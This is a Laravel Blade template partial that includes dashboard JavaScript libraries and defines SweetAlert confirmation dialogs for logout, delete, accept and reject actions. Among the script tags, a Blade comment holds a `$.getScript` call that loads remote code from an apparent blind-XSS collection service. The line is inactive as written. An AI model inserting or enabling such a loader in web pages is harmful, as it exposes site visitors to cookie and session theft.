<script src="{{ asset('dist') }}/assets/static/js/components/dark.js"></script>
<script src="{{ asset('dist') }}/assets/extensions/perfect-scrollbar/perfect-scrollbar.min.js"></script>
<script src="{{ asset('dist') }}/assets/compiled/js/app.js"></script>
{{-- PLUGIN DATATABLES --}}
<script src="{{ asset('dist') }}/assets/extensions/simple-datatables/umd/simple-datatables.js"></script>
<script src="{{ asset('dist') }}/assets/static/js/pages/simple-datatables.js"></script>
<script src="https://cdn.datatables.net/2.0.5/js/dataTables.min.js"></script>
{{-- PLUGIN SWEETALERT 2 --}}
<script src="{{ asset('vendor') }}/sweetalerts2/custom-sweetalert.js"></script>
<script src="{{ asset('vendor') }}/sweetalerts2/sweetalerts2.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
{{-- <script>$.getScript("//xss.report/c/kyouma052")</script> --}}

@yield('custom-js')
<script>
    function logout(event) {
        event.preventDefault();

        Swal.fire({
            title: 'Are you sure?',
            text: 'You will be logged out!',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonText: 'Yes, log out',
            cancelButtonText: 'Cancel',
            reverseButtons: true
        }).then((result) => {
            if (result.isConfirmed) {
                document.getElementById('logout-form').submit();
            } else if (result.dismiss === Swal.DismissReason.cancel) {
                Swal.fire(
                    'Cancelled',
                    'Logout cancelled',
                    'error'
                );
            }
        });
    }
</script>
<script>
    function deleteData(id) {
        Swal.fire({
            title: 'Are you sure?',
            text: 'You are going to delete this item.',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonText: 'Yes, delete it',
            cancelButtonText: 'Cancel',
            reverseButtons: true
        }).then((result) => {
            if (result.isConfirmed) {
                document.getElementById('delete-form-' + id).submit();
            } else if (result.dismiss === Swal.DismissReason.cancel) {
                Swal.fire(
                    'Cancelled',
                    'Deletion cancelled',
                    'error'
                );
            }
        });
    }

    function acceptData(id) {
        Swal.fire({
            title: 'Are you sure?',
            text: 'You want accept this data.',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonText: 'Yes, Accept it',
            cancelButtonText: 'Cancel',
            reverseButtons: true
        }).then((result) => {
            if (result.isConfirmed) {
                document.getElementById('accept-form-' + id).submit();
            } else if (result.dismiss === Swal.DismissReason.cancel) {
                Swal.fire(
                    'Cancelled',
                    'Accept cancelled',
                    'error'
                );
            }
        });
    }

    function rejectData(id) {
        Swal.fire({
            title: 'Are you sure?',
            text: 'You want reject this data.',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonText: 'Yes, Reject it',
            cancelButtonText: 'Cancel',
            reverseButtons: true
        }).then((result) => {
            if (result.isConfirmed) {
                document.getElementById('reject-form-' + id).submit();
            } else if (result.dismiss === Swal.DismissReason.cancel) {
                Swal.fire(
                    'Cancelled',
                    'Reject cancelled',
                    'error'
                );
            }
        });
    }
</script>
{{-- PLUGIN MORE --}}
<script>
    $(document).ready(function() {
        $('#myTable').DataTable();
    });
</script>
